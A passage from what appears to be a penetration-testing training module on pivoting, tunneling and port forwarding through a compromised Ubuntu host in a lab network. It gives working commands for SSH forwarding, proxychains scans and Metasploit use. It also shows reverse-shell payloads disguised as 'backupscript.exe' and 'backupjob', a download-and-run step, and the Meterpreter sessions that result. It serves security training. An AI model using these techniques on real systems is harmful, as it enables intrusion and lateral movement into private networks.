# Pivoting, Tunneling, and Port Forwarding

During a `red team engagement`, `penetration test`, or an `Active Directory assessment`, we will often find ourselves in a situation where we might have already compromised the required `credentials`, `ssh keys`, `hashes`, or `access tokens` to move onto another host, but there may be no other host directly reachable from our attack host. In such cases, we may need to use a `pivot host` that we have already compromised to find a way to our next target. One of the most important things to do when landing on a host for the first time is to check our `privilege level`, `network connections`, and potential `VPN or other remote access software`. If a host has more than one network adapter, we can likely use it to move to a different network segment. **Pivoting** is essentially the idea of `moving to other networks through a compromised host to find more targets on different network segments`.

Pivoting's primary use is to defeat segmentation (both physically and virtually) to access an isolated network. **Tunneling**, on the other hand, is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it. Think of it like this:

We have a `key` we need to send to a partner, but we do not want anyone who sees our package to know it is a key. So we get a stuffed animal toy and hide the key inside with instructions about what it does. We then package the toy up and send it to our partner. Anyone who inspects the box will see a simple stuffed toy, not realizing it contains something else. Only our partner will know that the key is hidden inside and will learn how to access and use it once delivered.

Typical applications like VPNs or specialized browsers are just another form of tunneling network traffic.

## Networking behind Pivoting

Whether assigned `dynamically` or `statically`, the IP address is assigned to a `Network Interface Controller` (`NIC`). Commonly, the NIC is referred to as a `Network Interface Card` or `Network Adapter`. A computer can have multiple NICs (physical and virtual), meaning it can have multiple IP addresses assigned, allowing it to communicate on various networks. Identifying pivoting opportunities will often depend on the specific IPs assigned to the hosts we compromise because they can indicate the networks compromised hosts can reach. This is why it is important for us to always check for additional NICs using commands like `ifconfig` (in macOS and Linux) and `ipconfig` (in Windows).

The VPN encrypts traffic and also establishes a tunnel over a public network (often the Internet), through **NAT** on a public-facing network appliance, and into the internal/private network. Also, notice the IP addresses assigned to each NIC. The IP assigned to eth0 (`134.122.100.200`) is a publicly routable IP address. Meaning ISPs will route traffic originating from this IP over the Internet.

We will see public IPs on devices that are directly facing the Internet, commonly hosted in DMZs. The other NICs have private IP addresses, which are routable within internal networks but not over the public Internet. At the time of writing, anyone that wants to communicate over the Internet must have at least one public IP address assigned to an interface on the network appliance that connects to the physical infrastructure connecting to the Internet. Recall that NAT is commonly used to translate private IP addresses to public IP addresses.

Every IPv4 address will have a corresponding `subnet mask`. If an IP address is like a phone number, the subnet mask is like the area code. Remember that the subnet mask defines the `network` & `host` portion of an IP address. When network traffic is destined for an IP address located in a different network, the computer will send the traffic to its assigned `default gateway`. The default gateway is usually the IP address assigned to a NIC on an appliance acting as the router for a given LAN. In the context of pivoting, we need to be mindful of what networks a host we land on can reach, so documenting as much IP addressing information as possible on an engagement can prove helpful.

### Routing

It is common to think of a network appliance that connects us to the Internet when thinking about a router, but technically any computer can become a router and participate in routing. Some of the challenges we will face in this module require us to make a pivot host route traffic to another network. One way we will see this is through the use of AutoRoute, which allows our attack box to have `routes` to target networks that are reachable through a pivot host. One key defining characteristic of a router is that it has a routing table that it uses to forward traffic based on the destination IP address. Let's look at this on Pwnbox using the commands `netstat -r` or `ip route`.

```bash
[!bash!]$ netstat -r

Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
default         178.62.64.1     0.0.0.0         UG        0 0          0 eth0
10.10.10.0      10.10.14.1      255.255.254.0   UG        0 0          0 tun0
10.10.14.0      0.0.0.0         255.255.254.0   U         0 0          0 tun0
10.106.0.0      0.0.0.0         255.255.240.0   U         0 0          0 eth1
10.129.0.0      10.10.14.1      255.255.0.0     UG        0 0          0 tun0
178.62.64.0     0.0.0.0         255.255.192.0   U         0 0          0 eth0
```

When a packet is created and has a destination before it leaves the computer, the routing table is used to decide where to send it. For example, if we are trying to connect to a target with the IP `10.129.10.25`, we could tell from the routing table where the packet would be sent to get there. It would be forwarded to a `Gateway` out of the corresponding NIC (`Iface`). Pwnbox is not using any routing protocols (EIGRP, OSPF, BGP, etc...) to learn each of those routes. It learned about those routes via its own directly connected interfaces (eth0, eth1, tun0). Stand-alone appliances designated as routers typically will learn routes using a combination of static route creation, dynamic routing protocols, and directly connected interfaces. Any traffic destined for networks not present in the routing table will be sent to the `default route`, which can also be referred to as the default gateway or gateway of last resort. When looking for opportunities to pivot, it can be helpful to look at the hosts' routing table to identify which networks we may be able to reach or which routes we may need to add.

## Dynamic Port Forwarding with SSH and SOCKS Tunneling

**Port forwarding** is a technique that allows us to redirect a communication request from one port to another. Port forwarding uses TCP as the primary communication layer to provide interactive communication for the forwarded port. However, different application layer protocols such as SSH or even SOCKS (non-application layer) can be used to encapsulate the forwarded traffic. This can be effective in bypassing firewalls and using existing services on your compromised host to pivot to other networks.

### SSH Local Port Forwarding

![](fig/port_forwarding.png)

We have our attack host (10.10.15.x) and a target Ubuntu server (10.129.x.x), which we have compromised. We will scan the target Ubuntu server using Nmap to search for open ports.

#### Scanning the Pivot Target

```bash
nmap -sT -p22,3306 10.129.202.64

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
Nmap scan report for 10.129.202.64
Host is up (0.12s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```

The Nmap output shows that the SSH port is open. To access the MySQL service, we can either SSH into the server and access MySQL from inside the Ubuntu server, or we can port forward it to our localhost on port `1234` and access it locally. A benefit of accessing it locally is if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding. This is due to MySQL being hosted locally on the Ubuntu server on port `3306`. So, we will use the below command to forward our local port (1234) over SSH to the Ubuntu server.

#### Executing the Local Port Forward

```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

ubuntu@10.129.202.64's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 24 Feb 2022 05:23:20 PM UTC

  System load:             0.0
  Usage of /:              28.4% of 13.72GB
  Memory usage:            34%
  Swap usage:              0%
  Processes:               175
  Users logged in:         1
  IPv4 address for ens192: 10.129.202.64
  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb
  IPv4 address for ens224: 172.16.5.129

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

66 updates can be applied immediately.
45 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable
```

The `-L` command tells the SSH client to request the SSH server to forward all the data we send via the port `1234` to `localhost:3306` on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234. We can use Netstat or Nmap to query our local host on 1234 port to verify whether the MySQL service was forwarded.

#### Confirming Port Forward with Netstat

```bash
netstat -antp | grep 1234

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh            
tcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh     
```

#### Confirming Port Forward with Nmap

```bash
nmap -v -sV -p1234 localhost

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:18 EST
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 12:18
Scanning localhost (127.0.0.1) [2 ports]
Completed Ping Scan at 12:18, 0.01s elapsed (1 total hosts)
Initiating Connect Scan at 12:18
Scanning localhost (127.0.0.1) [1 port]
Discovered open port 1234/tcp on 127.0.0.1
Completed Connect Scan at 12:18, 0.01s elapsed (1 total ports)
Initiating Service scan at 12:18
Scanning 1 service on localhost (127.0.0.1)
Completed Service scan at 12:18, 0.12s elapsed (1 service on 1 host)
NSE: Script scanning 127.0.0.1.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.01s elapsed
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0080s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
```

Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the `local port:server:port` argument to your ssh command. For example, the below command forwards the apache web server's port 80 to your attack host's local port on `8080`.

#### Forwarding Multiple Ports

```bash
matmarqx@htb[/htb]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

-------------------
### Setting up to Pivot

Now, if you type `ifconfig` on the Ubuntu host, you will find that this server has multiple NICs:

*   One connected to our attack host (`ens192`)
*   One communicating to other hosts within a different network (`ens224`)
*   The loopback interface (`lo`).

#### Looking for Opportunities to Pivot using ifconfig

```bash
ubuntu@WEB01:~$ ifconfig 

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)
        RX packets 35571  bytes 177919049 (177.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10452  bytes 1474767 (1.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)
        RX packets 8251  bytes 1125190 (1.1 MB)
        RX errors 0  dropped 40  overruns 0  frame 0
        TX packets 1538  bytes 123584 (123.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 270  bytes 22432 (22.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 270  bytes 22432 (22.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Unlike the previous scenario where we knew which port to access, in our current scenario, we don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (`172.16.5.1-200`) network or the entire subnet (`172.16.5.0/23`). We cannot perform this scan directly from our attack host because it does not have routes to the `172.16.5.0/23` network. To do this, we will have to perform `dynamic port forwarding` and `pivot` our network packets via the Ubuntu server. We can do this by starting a `SOCKS listener` on our `local host` (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host.

This is called `SSH tunneling` over `SOCKS proxy`. SOCKS stands for `Socket Secure`, a protocol that helps communicate with servers where you have firewall restrictions in place. Unlike most cases where you would initiate a connection to connect to a service, in the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client.

This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from `NAT networks`. SOCKS proxies are currently of two types: `SOCKS4` and `SOCKS5`. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that. Let's take an example of the below image where we have a NAT'd network of 172.16.5.0/23, which we cannot access directly.

![Diagram of Nmap scan setup: Attack Host (10.10.15.5) uses Proxychains and SSH Client to forward packets. SOCKS Listener on port 9050 forwards Nmap packets via SSH to Victim Server (10.129.15.50, 172.16.5.129) on port 22 for scanning.](fig/port_forwarding.png)

In the above image, the attack host starts the SSH client and requests the SSH server to allow it to send some TCP data over the ssh socket. The SSH server responds with an acknowledgment, and the SSH client then starts listening on `localhost:9050`. Whatever data you send here will be broadcasted to the entire network (172.16.5.0/23) over SSH. We can use the below command to perform this dynamic port forwarding.

#### Enabling Dynamic Port Forwarding with SSH

```bash
ssh -D 9050 ubuntu@10.129.202.64
```

The `-D` argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port `9050`. We can do this using the tool `proxychains`, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's `TCP traffic` to go through hosted proxies like `SOCKS4`/`SOCKS5`, `TOR`, or `HTTP`/`HTTPS` proxies.

To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at `/etc/proxychains.conf`. We can add `socks4 127.0.0.1 9050` to the last line if it is not already there.

#### Checking `/etc/proxychains.conf`

```bash
tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the `172.16.5.0/23` network.

#### Using Nmap with Proxychains

```bash
proxychains nmap -v -sn 172.16.5.1-200

ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:30 EST
Initiating Ping Scan at 12:30
Scanning 10 hosts [2 ports/host]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.2:80-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.5:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.6:80-<--timeout
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0

<SNIP>
```

This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called `SOCKS tunneling`. One more important note to remember here is that we can only perform a `full TCP connect scan` over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that `host-alive` checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.

[A full TCP connect scan](https://nmap.org/book/scan-methods-connect-scan.html) without ping on an entire network range will take a long time. So, for this module, we will primarily focus on scanning individual hosts, or smaller ranges of hosts we know are alive, which in this case will be a Windows host at `172.16.5.19`.

We will perform a remote system scan using the below command.

#### Enumerating the Windows Target through Proxychains

```bash
proxychains nmap -v -Pn -sT 172.16.5.19

ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:33 EST
Initiating Parallel DNS resolution of 1 host. at 12:33
Completed Parallel DNS resolution of 1 host. at 12:33, 0.15s elapsed
Initiating Connect Scan at 12:33
Scanning 172.16.5.19 [1000 ports]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:1720-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:587-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:445-<><>-OK
Discovered open port 445/tcp on 172.16.5.19
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:8080-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:23-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:135-<><>-OK
Discovered open port 135/tcp on 172.16.5.19
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:110-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:21-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:554-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-1172.16.5.19:25-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:5900-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:1025-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:143-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:199-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:993-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:995-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:443-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:113-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:8888-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:139-<><>-OK
Discovered open port 139/tcp on 172.16.5.19
```
    

The Nmap scan shows several open ports, one of which is `RDP port` (3389). Similar to the Nmap scan, we can also pivot `msfconsole` via proxychains to perform vulnerable RDP scans using Metasploit auxiliary modules. We can start msfconsole with proxychains.

---------------------------------

### Using Metasploit with Proxychains

We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.

```bash
proxychains msfconsole
ProxyChains-3.1 (http://proxychains.sf.net)
msf6 > 
```

Let's use the `rdp_scanner` auxiliary module to check if the host on the internal network is listening on 3389.

#### Using `rdp\_scanner` Module

```bash
msf6 > search rdp_scanner

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/rdp/rdp_scanner

msf6 > use 0
msf6 auxiliary(scanner/rdp/rdp_scanner) > set rhosts 172.16.5.19
rhosts => 172.16.5.19
msf6 auxiliary(scanner/rdp/rdp_scanner) > run
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK

[*] 172.16.5.19:3389      - Detected RDP on 172.16.5.19:3389      (name:DC01) (domain:DC01) (domain_fqdn:DC01) (server_fqdn:DC01) (os_version:10.0.17763) (Requires NLA: No)
[*] 172.16.5.19:3389      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

At the bottom of the output above, we can see the RDP port open with the Windows OS version.

Depending on the level of access we have to this host during an assessment, we may try to run an exploit or log in using gathered credentials. For this module, we will log in to the Windows remote host over the SOCKS tunnel. This can be done using `xfreerdp`. The user in our case is `victor,` and the password is `pass@123`

#### Using xfreerdp with Proxychains

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

The xfreerdp command will require an RDP certificate to be accepted before successfully establishing the session. After accepting it, we should have an RDP session, pivoting via the Ubuntu server.

#### Successful RDP Pivot

![Terminal running ProxyChains with xfreerdp command to connect to 172.16.5.19 as user 'victor'. Remote desktop shows Windows interface with Recycle Bin.](fig/proxychains_rdp.png)


## Remote/Reverse Port Forwarding with SSH

We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. But sometimes, we might want to forward a local service to the remote port as well. Let's consider the scenario where we can RDP into the Windows host `Windows A`. As can be seen in the image below, in our previous case, we could pivot into the Windows host via the Ubuntu server.

![Diagram showing network setup: Attack Host (10.10.15.5) connects via SSH to Victim Server (Ubuntu) at 10.129.15.50, 172.16.5.129. No route to Attack Host from Victim Server (Windows A) at 172.16.5.19 with RDP Service.](fig/how_to_remote_port_forward.png)

`But what happens if we try to gain a reverse shell?`

The `outgoing connection` for the Windows host is only limited to the `172.16.5.0/23` network. This is because the Windows host does not have any direct connection with the network the attack host is on. If we start a Metasploit listener on our attack host and try to get a reverse shell, we won't be able to get a direct connection here because the Windows server doesn't know how to route traffic leaving its network (172.16.5.0/23) to reach the 10.129.x.x (the Academy Lab network).

There are several times during a penetration testing engagement when having just a remote desktop connection is not feasible. You might want to `upload`/`download` files (when the RDP clipboard is disabled), `use exploits` or `low-level Windows API` using a Meterpreter session to perform enumeration on the Windows host, which is not possible using the built-in [Windows executables](https://lolbas-project.github.io/).

In these cases, we would have to find a pivot host, which is a common connection point between our attack host and the Windows server. In our case, our pivot host would be the Ubuntu server since it can connect to both: `our attack host` and `the Windows target`. To gain a `Meterpreter shell` on Windows, we will create a Meterpreter HTTPS payload using `msfvenom`, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (`172.16.5.129`). We will use the port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, where our Metasploit listener is running.

#### Creating a Windows Payload with msfvenom

    matmarqx@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
    
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 712 bytes
    Final size of exe file: 7168 bytes
    Saved as: backupscript.exe
    

#### Configuring & Starting the multi/handler

    msf6 > use exploit/multi/handler
    
    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
    payload => windows/x64/meterpreter/reverse_https
    msf6 exploit(multi/handler) > set lhost 0.0.0.0
    lhost => 0.0.0.0
    msf6 exploit(multi/handler) > set lport 8000
    lport => 8000
    msf6 exploit(multi/handler) > run
    
    [*] Started HTTPS reverse handler on https://0.0.0.0:8000
    

Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the `scp` command since we already have the credentials to connect to the Ubuntu server using SSH.

#### Transferring Payload to Pivot Host

    matmarqx@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
    
    backupscript.exe                                   100% 7168    65.4KB/s   00:00 
    

After copying the payload, we will start a `python3 HTTP server` using the below command on the Ubuntu server in the same directory where we copied our payload.

#### Starting Python3 Webserver on Pivot Host

    ubuntu@Webserver$ python3 -m http.server 8123
    

#### Downloading Payload on the Windows Target

We can download this `backupscript.exe` on the Windows host via a web browser or the PowerShell cmdlet `Invoke-WebRequest`.

    PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
    

Once we have our payload downloaded on the Windows host, we will use `SSH remote port forwarding` to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use `-vN` argument in our SSH command to make it verbose and ask it not to prompt the login shell. The `-R` command asks the Ubuntu server to listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`.

#### Using SSH -R

    matmarqx@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
    

After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.

#### Viewing the Logs from the Pivot

    ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
    debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
    debug1: channel 1: new [172.16.5.19]
    debug1: confirm forwarded-tcpip
    debug1: channel 0: free: 172.16.5.19, nchannels 2
    debug1: channel 1: connected to 0.0.0.0 port 8000
    debug1: channel 1: free: 172.16.5.19, nchannels 1
    debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
    debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
    debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
    debug1: channel 0: new [172.16.5.19]
    debug1: confirm forwarded-tcpip
    debug1: channel 0: connected to 0.0.0.0 port 8000
    

If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.

#### Meterpreter Session Established

    [*] Started HTTPS reverse handler on https://0.0.0.0:8000
    [!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
    [*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
    [!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
    [*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500
    
    meterpreter > shell
    Process 3236 created.
    Channel 1 created.
    Microsoft Windows [Version 10.0.17763.1637]
    (c) 2018 Microsoft Corporation. All rights reserved.
    
    C:\>
    

Our Meterpreter session should list that our incoming connection is from a local host itself (`127.0.0.1`) since we are receiving the connection over the `local SSH socket`, which created an `outbound` connection to the Ubuntu server. Issuing the `netstat` command can show us that the incoming connection is from the SSH service.

The below graphical representation provides an alternative way to understand this technique.

![Diagram showing network setup: Attack Host (10.10.15.5) forwards remote port 8080 to local port 8000 via SSH. Victim Server (Ubuntu) listens on port 8080, forwards to SSH. Victim Server (Windows A) at 172.16.5.19 with RDP Service. Reverse shell forwarded to MSFConsole on port 8000.](fig/remote_port_forwarding.png)


## Meterpreter Tunneling & Port Forwarding

Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host), and we want to perform enumeration scans through the pivot host, but we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the below command, which will return a shell on our attack host on port `8080`.

#### Creating Payload for Ubuntu Pivot Host

    matmarqx@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
    
    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 130 bytes
    Final size of elf file: 250 bytes
    Saved as: backupjob
    

Before copying the payload over, we can start a [multi/handler](https://www.rapid7.com/db/modules/exploit/multi/handler/), also known as a Generic Payload Handler.

#### Configuring & Starting the multi/handler

    msf6 > use exploit/multi/handler
    
    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set lhost 0.0.0.0
    lhost => 0.0.0.0
    msf6 exploit(multi/handler) > set lport 8080
    lport => 8080
    msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
    payload => linux/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > run
    [*] Started reverse TCP handler on 0.0.0.0:8080 
    

We can copy the `backupjob` binary file to the Ubuntu pivot host `over SSH` and execute it to gain a Meterpreter session.

#### Executing the Payload on the Pivot Host

    ubuntu@WebServer:~$ ls
    
    backupjob
    ubuntu@WebServer:~$ chmod +x backupjob 
    ubuntu@WebServer:~$ ./backupjob
    

We need to make sure the Meterpreter session is successfully established upon executing the payload.

#### Meterpreter Session Establishment

    [*] Sending stage (3020772 bytes) to 10.129.202.64
    [*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
    meterpreter > pwd
    
    /home/ubuntu
    

We know that the Windows target is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the `ping_sweep` module, which will generate the ICMP traffic from the Ubuntu host to the network `172.16.5.0/23`.

#### Ping Sweep

    meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
    
    [*] Performing ping sweep for IP range 172.16.5.0/23
    

We could also perform a ping sweep using a `for loop` directly on a target pivot host that will ping any device in the network range we specify. Here are two helpful ping sweep for loop one-liners we could use for Linux-based and Windows-based pivot hosts.

#### Ping Sweep For Loop on Linux Pivot Hosts

    for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
    

#### Ping Sweep For Loop Using CMD

    for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
    

#### Ping Sweep Using PowerShell

    1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
    

Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build its arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.

There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host. We will configure the SOCKS proxy for `SOCKS version 4a`. This SOCKS configuration will start a listener on port `9050` and route all the traffic received via our Meterpreter session.

#### Configuring MSF's SOCKS Proxy

    msf6 > use auxiliary/server/socks_proxy
    
    msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
    SRVPORT => 9050
    msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
    SRVHOST => 0.0.0.0
    msf6 auxiliary(server/socks_proxy) > set version 4a
    version => 4a
    msf6 auxiliary(server/socks_proxy) > run
    [*] Auxiliary module running as background job 0.
    
    [*] Starting the SOCKS proxy server
    msf6 auxiliary(server/socks_proxy) > options
    
    Module options (auxiliary/server/socks_proxy):
    
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
